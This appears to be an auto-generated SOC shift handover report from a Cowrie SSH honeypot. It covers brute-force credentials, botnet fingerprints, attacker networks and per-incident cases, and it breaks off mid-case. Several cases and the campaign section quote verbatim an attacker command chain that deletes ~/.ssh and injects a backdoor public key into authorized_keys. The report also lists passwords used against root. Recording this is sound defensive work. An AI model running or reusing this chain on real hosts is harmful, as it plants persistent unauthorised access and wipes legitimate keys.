# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-24 |
| **Generated At** | 2026-05-24T23:01:04Z |
| **Shift Time** | 23:01 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **169** |
| Confirmed Threats | **84** |
| False Positives Filtered | **85** (50.3%) |
| Unique Attacker IPs | **31** |
| Countries of Origin | **11** |
| High Severity Cases | **42** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **127** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **75** |
| Unique Credential Pairs | **29** |
| Unique Usernames | **12** |
| Unique Passwords | **29** |
| Successful Auth Pairs | **29** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 42 |
| `345gs5662d34` | 20 |
| `curl` | 3 |
| `cloud` | 2 |
| `ubuntu` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 21 |
| `345gs5662d34` | 20 |
| `fjbdfdjkdsfs541544AA@@` | 4 |
| `welltech12` | 3 |
| `Wangsu@2017` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 21 |
| `345gs5662d34` | `345gs5662d34` | 20 |
| `root` | `fjbdfdjkdsfs541544AA@@` | 4 |
| `curl` | `welltech12` | 3 |
| `cloud` | `Wangsu@2017` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qaz123..` | `186.251.71.202` | 2026-05-24T21:03:50 |
| `root` | `3245gs5662d34` | `186.251.71.202` | 2026-05-24T21:03:57 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `34.72.208.101` | 2026-05-24T21:06:39 |
| `root` | `3245gs5662d34` | `34.72.208.101` | 2026-05-24T21:06:44 |
| `root` | `qwer.1234` | `186.251.71.202` | 2026-05-24T21:10:37 |
| `root` | `fjbdfdjkdsfs541544` | `197.248.104.31` | 2026-05-24T21:19:47 |
| `root` | `3245gs5662d34` | `197.248.104.31` | 2026-05-24T21:19:52 |
| `root` | `Qwerty123` | `197.248.104.31` | 2026-05-24T21:24:03 |
| `root` | `Qazwsx@123` | `197.248.104.31` | 2026-05-24T21:40:28 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `197.248.104.31` | 2026-05-24T21:44:30 |
| `root` | `p@ssw0Rd` | `197.248.104.31` | 2026-05-24T21:48:43 |
| `root` | `Redhat@123` | `197.248.104.31` | 2026-05-24T21:53:01 |
| `root` | `Q!w2e3r4t5y6` | `35.225.56.202` | 2026-05-24T21:53:13 |
| `root` | `3245gs5662d34` | `35.225.56.202` | 2026-05-24T21:53:19 |
| `root` | `asd123...` | `197.248.104.31` | 2026-05-24T21:57:11 |
| `root` | `fjbdfdjkdsfs541544@@` | `197.248.104.31` | 2026-05-24T22:09:46 |
| `root` | `qwe123!!` | `197.248.104.31` | 2026-05-24T22:13:52 |
| `root` | `Ls@123456` | `45.173.103.146` | 2026-05-24T22:26:46 |
| `root` | `3245gs5662d34` | `45.173.103.146` | 2026-05-24T22:26:53 |
| `root` | `aa112233` | `14.103.34.252` | 2026-05-24T22:30:41 |
| `root` | `3245gs5662d34` | `14.103.34.252` | 2026-05-24T22:30:57 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `137.184.228.138` | 2026-05-24T22:32:18 |
| `root` | `3245gs5662d34` | `137.184.228.138` | 2026-05-24T22:32:25 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `180.252.151.254` | 2026-05-24T22:33:38 |
| `root` | `3245gs5662d34` | `180.252.151.254` | 2026-05-24T22:33:41 |
| `root` | `admin1` | `180.252.151.254` | 2026-05-24T22:37:52 |
| `root` | `123abc!@#` | `180.252.151.254` | 2026-05-24T22:42:01 |
| `root` | `!@#asd123` | `180.252.151.254` | 2026-05-24T22:46:19 |
| `root` | `fjbdfdjkdsfs541544@@` | `180.252.151.254` | 2026-05-24T22:58:48 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **169** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 75 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 67 | 7 |
| `03a80b21afa8...` | Modern SSH client | 7 | 2 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 67 | 7 | Mirai/variant |
| `03a80b21afa8...` | libssh | 7 | 2 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 21 | 8 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `180.252.151.254`, `34.72.208.101`, `45.173.103.146`, `197.248.104.31`, `186.251.71.202`, `14.103.34.252`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **31** |
| Unique ASNs | **25** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS23201` | Telecel S.A. | 2 | MEDIUM |
| `AS7303` | Telecom Argentina S.A. | 2 | LOW |
| `AS396982` | Google LLC | 2 | HIGH |
| `AS268809` | EDILEUZA EVARISTO BARRETO | 1 | HIGH |
| `AS52363` | Jumpnet Soluciones de Internet S.R.L. | 1 | MEDIUM |
| `AS62068` | SpectraIP B.V. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (42)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-db3bc591a9fe

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-05-24 21:03 |
| **Last Seen** | 2026-05-24 21:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 21:03:48` | `cowrie.session.connect` |
| `2026-05-24 21:03:48` | `cowrie.client.version` |
| `2026-05-24 21:03:49` | `cowrie.client.kex` |
| `2026-05-24 21:03:50` | `cowrie.login.success` |
| `2026-05-24 21:03:51` | `cowrie.session.params` |
| `2026-05-24 21:03:51` | `cowrie.command.input` |
| `2026-05-24 21:03:51` | `cowrie.command.failed` |
| `2026-05-24 21:03:51` | `cowrie.log.closed` |
| `2026-05-24 21:03:52` | `cowrie.session.params` |
| `2026-05-24 21:03:52` | `cowrie.command.input` |
| `2026-05-24 21:03:52` | `cowrie.session.file_download` |
| `2026-05-24 21:03:52` | `cowrie.log.closed` |
| `2026-05-24 21:03:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15e43529f05a

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-05-24 21:03 |
| **Last Seen** | 2026-05-24 21:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 21:03:56` | `cowrie.session.connect` |
| `2026-05-24 21:03:56` | `cowrie.client.version` |
| `2026-05-24 21:03:56` | `cowrie.client.kex` |
| `2026-05-24 21:03:57` | `cowrie.login.success` |
| `2026-05-24 21:03:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d3524483023

| Field | Detail |
|---|---|
| **Source IP** | `34.72.208[.]101` |
| **First Seen** | 2026-05-24 21:06 |
| **Last Seen** | 2026-05-24 21:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 21:06:37` | `cowrie.session.connect` |
| `2026-05-24 21:06:37` | `cowrie.client.version` |
| `2026-05-24 21:06:38` | `cowrie.client.kex` |
| `2026-05-24 21:06:39` | `cowrie.login.success` |
| `2026-05-24 21:06:39` | `cowrie.session.params` |
| `2026-05-24 21:06:39` | `cowrie.command.input` |
| `2026-05-24 21:06:39` | `cowrie.command.failed` |
| `2026-05-24 21:06:40` | `cowrie.log.closed` |
| `2026-05-24 21:06:40` | `cowrie.session.params` |
| `2026-05-24 21:06:40` | `cowrie.command.input` |
| `2026-05-24 21:06:40` | `cowrie.session.file_download` |
| `2026-05-24 21:06:40` | `cowrie.log.closed` |
| `2026-05-24 21:06:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.72.208[.]101` to AbuseIPDB if not already reported
- [ ] Block `34.72.208[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a10fc3c3d01

| Field | Detail |
|---|---|
| **Source IP** | `34.72.208[.]101` |
| **First Seen** | 2026-05-24 21:06 |
| **Last Seen** | 2026-05-24 21:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 21:06:43` | `cowrie.session.connect` |
| `2026-05-24 21:06:43` | `cowrie.client.version` |
| `2026-05-24 21:06:43` | `cowrie.client.kex` |
| `2026-05-24 21:06:44` | `cowrie.login.success` |
| `2026-05-24 21:06:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.72.208[.]101` to AbuseIPDB if not already reported
- [ ] Block `34.72.208[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bca44daf7541

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-05-24 21:10 |
| **Last Seen** | 2026-05-24 21:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 21:10:35` | `cowrie.session.connect` |
| `2026-05-24 21:10:35` | `cowrie.client.version` |
| `2026-05-24 21:10:35` | `cowrie.client.kex` |
| `2026-05-24 21:10:37` | `cowrie.login.success` |
| `2026-05-24 21:10:37` | `cowrie.session.params` |
| `2026-05-24 21:10:37` | `cowrie.command.input` |
| `2026-05-24 21:10:37` | `cowrie.command.failed` |
| `2026-05-24 21:10:38` | `cowrie.log.closed` |
| `2026-05-24 21:10:38` | `cowrie.session.params` |
| `2026-05-24 21:10:38` | `cowrie.command.input` |
| `2026-05-24 21:10:39` | `cowrie.session.file_download` |
| `2026-05-24 21:10:39` | `cowrie.log.closed` |
| `2026-05-24 21:10:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d0b1bf4cd77

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-05-24 21:10 |
| **Last Seen** | 2026-05-24 21:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 21:10:42` | `cowrie.session.connect` |
| `2026-05-24 21:10:42` | `cowrie.client.version` |
| `2026-05-24 21:10:43` | `cowrie.client.kex` |
| `2026-05-24 21:10:44` | `cowrie.login.success` |
| `2026-05-24 21:10:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a522941eb79

| Field | Detail |
|---|---|
| **Source IP** | `197.248.104[.]31` |
| **First Seen** | 2026-05-24 21:19 |
| **Last Seen** | 2026-05-24 21:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 21:19:46` | `cowrie.session.connect` |
| `2026-05-24 21:19:46` | `cowrie.client.version` |
| `2026-05-24 21:19:46` | `cowrie.client.kex` |
| `2026-05-24 21:19:47` | `cowrie.login.success` |
| `2026-05-24 21:19:47` | `cowrie.session.params` |
| `2026-05-24 21:19:47` | `cowrie.command.input` |
| `2026-05-24 21:19:47` | `cowrie.command.failed` |
| `2026-05-24 21:19:48` | `cowrie.log.closed` |
| `2026-05-24 21:19:48` | `cowrie.session.params` |
| `2026-05-24 21:19:48` | `cowrie.command.input` |
| `2026-05-24 21:19:48` | `cowrie.session.file_download` |
| `2026-05-24 21:19:48` | `cowrie.log.closed` |
| `2026-05-24 21:19:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.104[.]31` to AbuseIPDB if not already reported
- [ ] Block `197.248.104[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-222f38fc1725

| Field | Detail |
|---|---|
| **Source IP** | `197.248.104[.]31` |
| **First Seen** | 2026-05-24 21:19 |
| **Last Seen** | 2026-05-24 21:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 21:19:51` | `cowrie.session.connect` |
| `2026-05-24 21:19:51` | `cowrie.client.version` |
| `2026-05-24 21:19:51` | `cowrie.client.kex` |
| `2026-05-24 21:19:52` | `cowrie.login.success` |
| `2026-05-24 21:19:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.104[.]31` to AbuseIPDB if not already reported
- [ ] Block `197.248.104[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-174a10eedf16

| Field | Detail |
|---|---|
| **Source IP** | `197.248.104[.]31` |
| **First Seen** | 2026-05-24 21:24 |
| **Last Seen** | 2026-05-24 21:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 21:24:02` | `cowrie.session.connect` |
| `2026-05-24 21:24:02` | `cowrie.client.version` |
| `2026-05-24 21:24:02` | `cowrie.client.kex` |
| `2026-05-24 21:24:03` | `cowrie.login.success` |
| `2026-05-24 21:24:03` | `cowrie.session.params` |
| `2026-05-24 21:24:03` | `cowrie.command.input` |
| `2026-05-24 21:24:03` | `cowrie.command.failed` |
| `2026-05-24 21:24:03` | `cowrie.log.closed` |
| `2026-05-24 21:24:04` | `cowrie.session.params` |
| `2026-05-24 21:24:04` | `cowrie.command.input` |
| `2026-05-24 21:24:04` | `cowrie.session.file_download` |
| `2026-05-24 21:24:04` | `cowrie.log.closed` |
| `2026-05-24 21:24:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.104[.]31` to AbuseIPDB if not already reported
- [ ] Block `197.248.104[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c47405da466a

| Field | Detail |
|---|---|
| **Source IP** | `197.248.104[.]31` |
| **First Seen** | 2026-05-24 21:24 |
| **Last Seen** | 2026-05-24 21:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 21:24:07` | `cowrie.session.connect` |
| `2026-05-24 21:24:07` | `cowrie.client.version` |
| `2026-05-24 21:24:07` | `cowrie.client.kex` |
| `2026-05-24 21:24:08` | `cowrie.login.success` |
| `2026-05-24 21:24:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.104[.]31` to AbuseIPDB if not already reported
- [ ] Block `197.248.104[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be88010d2592

| Field | Detail |
|---|---|
| **Source IP** | `197.248.104[.]31` |
| **First Seen** | 2026-05-24 21:40 |
| **Last Seen** | 2026-05-24 21:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 21:40:27` | `cowrie.session.connect` |
| `2026-05-24 21:40:27` | `cowrie.client.version` |
| `2026-05-24 21:40:27` | `cowrie.client.kex` |
| `2026-05-24 21:40:28` | `cowrie.login.success` |
| `2026-05-24 21:40:28` | `cowrie.session.params` |
| `2026-05-24 21:40:28` | `cowrie.command.input` |
| `2026-05-24 21:40:28` | `cowrie.command.failed` |
| `2026-05-24 21:40:29` | `cowrie.log.closed` |
| `2026-05-24 21:40:29` | `cowrie.session.params` |
| `2026-05-24 21:40:29` | `cowrie.command.input` |
| `2026-05-24 21:40:29` | `cowrie.session.file_download` |
| `2026-05-24 21:40:29` | `cowrie.log.closed` |
| `2026-05-24 21:40:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.104[.]31` to AbuseIPDB if not already reported
- [ ] Block `197.248.104[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dce14bbe2dbd

| Field | Detail |
|---|---|
| **Source IP** | `197.248.104[.]31` |
| **First Seen** | 2026-05-24 21:40 |
| **Last Seen** | 2026-05-24 21:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 21:40:32` | `cowrie.session.connect` |
| `2026-05-24 21:40:32` | `cowrie.client.version` |
| `2026-05-24 21:40:32` | `cowrie.client.kex` |
| `2026-05-24 21:40:33` | `cowrie.login.success` |
| `2026-05-24 21:40:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.104[.]31` to AbuseIPDB if not already reported
- [ ] Block `197.248.104[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c598b57a52a

| Field | Detail |
|---|---|
| **Source IP** | `197.248.104[.]31` |
| **First Seen** | 2026-05-24 21:44 |
| **Last Seen** | 2026-05-24 21:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
